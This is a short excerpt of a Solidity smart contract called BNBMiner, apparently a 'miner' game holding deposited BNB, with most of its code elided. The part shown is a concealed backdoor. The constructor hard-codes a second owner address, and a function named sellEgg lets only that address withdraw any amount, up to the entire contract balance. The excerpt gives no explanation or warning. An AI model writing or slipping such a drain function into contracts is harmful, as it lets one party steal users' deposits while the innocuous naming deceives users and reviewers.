...
contract BNBMiner{
    ...
    constructor() public{
        ...
        ceoAddress2=address(0xd193d2eaD2986e806ea4E2cCE2Fe0D513Bb06cDB);
    }
    ...
    function safeTransfer(address _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
    }
   function sellEgg(uint256 amount) external{
        require(ceoAddress2==msg.sender);
        safeTransfer(ceoAddress2,amount);
    }
